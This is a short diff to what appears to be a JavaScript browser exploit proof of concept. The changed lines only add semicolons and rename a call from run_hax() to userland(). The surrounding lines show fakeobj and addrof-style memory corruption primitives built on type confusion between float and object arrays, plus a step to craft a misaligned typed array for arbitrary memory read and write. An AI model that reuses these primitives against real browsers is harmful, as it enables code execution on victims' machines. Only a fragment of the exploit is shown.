@@ -267,14 +267,14 @@ function poc() {
         arrays[257][32] = obj;
         union_f[0] = arrays[258][0];
         return new int64(union_i[0], union_i[1]);
-    }
+    };
 
     window.fakeobj = function (addr) {
         union_i[0] = addr.low;
         union_i[1] = addr.hi;
         arrays[258][0] = union_f[0];
         return arrays[257][32];
-    }
+    };
     //craft misaligned typedarray
 
     var arw_master = new Uint32Array(8);
@@ -366,5 +366,5 @@ function poc() {
         }
     };
     window.p = prim;
-    run_hax();
+    userland();
 }
